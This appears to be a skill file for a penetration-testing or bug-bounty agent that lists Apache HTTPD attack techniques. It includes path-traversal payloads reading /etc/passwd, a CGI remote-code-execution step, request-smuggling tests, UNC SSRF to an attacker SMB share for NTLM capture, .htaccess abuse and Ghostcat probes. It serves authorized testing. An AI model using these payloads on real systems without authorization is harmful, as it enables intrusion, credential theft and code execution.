---
name: apache-httpd
description: Apache HTTPD attack surface: mod_rewrite path confusion, .htaccess overrides, mod_proxy SSRF
depends_on: []
---

# Apache Httpd

Apache is everywhere. mod_rewrite gives infinite footgun potential. .htaccess can override security if AllowOverride is too permissive.

## Common Bug Classes

- mod_rewrite RewriteRule confusion allowing path bypass
- .htaccess overriding parent auth/security directives
- mod_proxy with `ProxyPass http://internal/` allowing SSRF
- mod_status / server-info exposure (`/server-status`, `/server-info`)
- Apache 2.4.49/50 path-traversal CVE
- HTTP request smuggling between Apache front-end and backend
- mod_proxy_ajp request smuggling on protocol translation boundary
- Encoded backreference injection in mod_rewrite substitution patterns
- UNC path SSRF on Windows deployments via mod_proxy

## Path Traversal and Normalization Attacks (90 reports, $216K corpus)

### Double-Decode Path Traversal (CVE-2021-41773 / CVE-2021-42013)
1. Test: `/icons/.%2e/%2e%2e/%2e%2e/etc/passwd` (single-encode traversal)
2. Test: `/icons/%%32%65%%32%65/%%32%65%%32%65/etc/passwd` (double-encode, bypass for the 2.4.50 fix)
3. These work when `Require all granted` is set on a directory and `mod_cgi` is enabled
4. If CGI is enabled, escalate from file read to RCE: `/cgi-bin/.%2e/%2e%2e/bin/sh` with POST body as command

### Two Co-Existing Path Semantics
Whenever Apache has both logical path interpretation (mod_rewrite, mod_alias) and physical filesystem mapping:
1. Test encoded question marks in backreferences: `%3f` in a rewritten URL may split the path at the origin
2. Test encoded slashes: `%2f` may bypass RewriteRule patterns that match on literal `/`
3. Test null bytes: `%00` may truncate the path at the filesystem layer
4. The principle: mod_rewrite operates on one URL representation, the filesystem on another — any difference is exploitable

### Patch-Diff Bypass Methodology
When an Apache CVE is announced:
1. Immediately diff the patch to identify the exact input space it checks
2. Test inputs OUTSIDE the patched check but in the same semantic class
3. CVE-2021-42013 was a bypass of CVE-2021-41773's fix — the fix checked `%2e` but not `%%32%65`
4. This pattern repeats across Apache versions: every normalization fix is a candidate for double-encode bypass

## HTTP Request Smuggling

### mod_proxy Desync
1. Identify the proxy chain: Apache mod_proxy -> backend (Tomcat, Node, Jetty, Gunicorn)
2. Test CL.TE: Apache uses Content-Length, backend uses Transfer-Encoding
3. Test TE.CL: Apache uses Transfer-Encoding, backend uses Content-Length
4. Test timing-based (pause-based) desync: send partial body with a long pause between chunks

### mod_proxy_ajp Smuggling
When Apache proxies to Tomcat via AJP:
1. AJP protocol translates HTTP headers into binary format — any header the proxy passes becomes a trusted attribute
2. Test for arbitrary header injection: if Apache forwards custom headers to AJP, they may override Tomcat's internal attributes
3. `SECRET` and `REMOTE_USER` AJP attributes can be spoofed if the AJP connector does not require a shared secret

### HTTP/2 to HTTP/1.1 Downgrade
1. If Apache serves HTTP/2 and proxies to HTTP/1.1 backend:
2. Test request-line injection via HTTP/2 pseudo-headers (`:path` with CRLF injection)
3. Test `Content-Length` disagreement between H2 and H1.1 layers
4. Every H2-to-H1 downgrade proxy is a smuggling candidate

## mod_rewrite Exploitation

### Encoded Backreference Injection
1. When mod_rewrite captures part of the URL and uses it in a substitution (`$1`, `$2`):
2. If the captured group contains encoded characters (`%3f`, `%23`, `%0d%0a`), they may be decoded in the substitution context
3. Test: `%3f` (encoded `?`) in a rewritten path can inject query parameters at the origin
4. Test: `%0d%0a` (CRLF) in backreferences can inject headers in proxied requests

### RewriteRule Pattern Bypass
1. RewriteRules that deny access based on path patterns (e.g., `RewriteRule ^/admin - [F]`) can be bypassed with:
   - URL encoding: `/ad%6din` bypasses literal string match
   - Path parameter: `/admin;foo` — Apache may strip the parameter before matching
   - Trailing dot: `/admin.` — filesystem resolves, pattern does not match
   - Case variations on case-insensitive filesystems: `/Admin`, `/ADMIN`

## Windows-Specific SSRF (mod_proxy)

When Apache runs on Windows:
1. Test UNC paths in proxied URLs: `//attacker-smb-server/share` — Apache may interpret `//` as a UNC path and make an outbound SMB connection
2. Test: `http://target/proxy?url=\\\\attacker\\share` via mod_proxy
3. UNC path SSRF captures NTLM hashes that can be cracked or relayed
4. Also test for Windows drive-letter path confusion: `C:/windows/win.ini` in path traversal payloads

## Module-Specific Exposure

### mod_status and mod_info
1. Probe: `/server-status`, `/server-status?auto`, `/server-info`
2. `mod_status` reveals: active connections, request URIs (potentially with session tokens), client IPs, vhost configuration
3. `mod_info` reveals: full Apache configuration including loaded modules, directory directives, rewrite rules
4. These are often restricted by IP but accessible via SSRF or from internal networks

### mod_cgi and mod_cgid
1. If CGI is enabled, path traversal escalates to RCE (execute arbitrary binaries via CGI interface)
2. Test for `.cgi`, `.pl`, `.py`, `.sh` file execution in unexpected directories
3. Check if `ScriptAlias` or `AddHandler cgi-script` is configured too broadly

## Privilege Escalation (CVE-2019-0211)

In Apache 2.4.17-2.4.38 on Unix:
1. Worker processes (low privilege) share mutable state with the parent process (root)
2. If you can execute code as the Apache worker (via RCE in a web app), you can manipulate the shared memory scoreboard
3. On graceful restart, the parent process reads the corrupted scoreboard and executes attacker-controlled function pointers as root
4. This is relevant when chaining with any other bug that gives code execution in the Apache worker context

## .htaccess Security Override

### AllowOverride Exploitation
1. If `AllowOverride All` is set, an attacker who can upload a `.htaccess` file controls the directory's Apache config
2. Test if `.htaccess` upload is possible via any file upload feature (even if the extension is filtered, some parsers accept `.htaccess`)
3. With `.htaccess` control: `php_value auto_prepend_file /etc/passwd` for file inclusion, `AddType application/x-httpd-php .jpg` for PHP execution via image upload
4. Test if `.htaccess` files are readable: `GET /.htaccess` — reveals RewriteRules, auth config, and internal paths

### Configuration Disclosure
1. Test `/.htpasswd`, `/.htgroup` for credential file exposure
2. Test `/httpd.conf`, `/apache2.conf`, `/conf/httpd.conf` for main config disclosure
3. Test `/.svn/`, `/.git/`, `/CVS/` for version control exposure on Apache-served directories
4. `mod_info` at `/server-info` reveals the COMPLETE parsed Apache configuration — every directive, every module

## Tomcat Behind Apache (AJP Ghostcat Pattern)

When Apache fronts Tomcat via mod_proxy_ajp:
1. If AJP port 8009 is directly accessible (no firewall), the Ghostcat vulnerability (CVE-2020-1938) allows arbitrary file read and potential RCE
2. Test: connect to port 8009 directly and send an AJP request with `javax.servlet.include.request_uri` attribute set to `/WEB-INF/web.xml`
3. If the AJP connector has `secretRequired=false`, no shared secret is needed
4. Even with a patched Tomcat, Apache's AJP proxy may forward headers that Tomcat treats as trusted internal attributes

## Connection-String and Template Injection (Airflow/Jenkins Pattern)

When Apache serves applications like Airflow, Jenkins, or other workflow tools:
1. Test connection string parameters for injection: JDBC URLs, ODBC DSNs, MongoDB URIs, Redis URIs
2. These connection strings are DSL-like and accept parameters with code-execution semantics (e.g., JDBC `autoDeserialize=true`)
3. Template-then-shell patterns: any workflow system that lets users define templated commands is an RCE target
4. Test every provider/hook/integration that builds CLI commands from user-controlled config values

## Probe Targets

- Probe `/server-status`, `/server-info`, `/server-status?auto`
- Test path traversal: `/icons/.%2e/%2e%2e/%2e%2e/etc/passwd`
- Test double-encode: `/icons/%%32%65%%32%65/%%32%65%%32%65/etc/passwd`
- Check for `.htaccess` content disclosure
- Send conflicting CL/TE headers to probe for smuggling
- Test mod_rewrite backreferences with `%3f`, `%23`, `%0d%0a` encoding
- Fingerprint version via `Server:` header — match against CVE list
- Test mod_proxy reverse proxy for SSRF via internal URL manipulation
- On Windows targets: test UNC path SSRF (`//attacker/share`)
- Check if AJP connector (port 8009) is exposed without shared secret

## Version-Specific CVEs (High-Value)

| Version | CVE | Impact |
|---|---|---|
| 2.4.49 | CVE-2021-41773 | Path traversal + RCE (if CGI enabled) |
| 2.4.50 | CVE-2021-42013 | Bypass of 41773 fix via double-encode |
| 2.4.17-2.4.38 | CVE-2019-0211 | Local root privilege escalation |
| 2.4.x with mod_proxy | CVE-2024-38472 | UNC SSRF on Windows |
| 2.4.x with mod_rewrite | CVE-2024-38474 | Encoded backreference injection |

## Cross-References

`path_traversal_lfi_rfi`, `ssrf`, `information_disclosure`

## Validation Requirements

- Reproduce findings with at least one alternate principal where authz is involved
- Verify version disclosure aligns with the CVE list before claiming version-specific impact
- Distinguish "tech detected" from "tech vulnerable" — many fingerprints just identify the stack
